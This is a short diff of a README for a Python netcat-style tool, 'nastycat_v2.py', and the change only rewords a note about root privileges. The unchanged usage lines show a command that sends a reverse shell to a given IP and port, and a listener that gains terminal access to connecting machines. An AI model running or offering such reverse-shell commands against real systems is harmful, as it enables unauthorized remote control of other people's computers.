@@ -57,7 +57,7 @@ python3 ./nastycat_v2.py -s 192.168.3.41 -p 5555 # sends an actual reverse shell
 python3 ./nastycat_v2.py -ls # starts a server, when a client connects, gets access to the servers terminal.
 ```
 
-Note - This may require root priviledges.
+Note - This script may require root priviledges on some scenarios.
 
 ## Contribution
 Any body can voluntarily contribute to this project if he/she has a better idea.
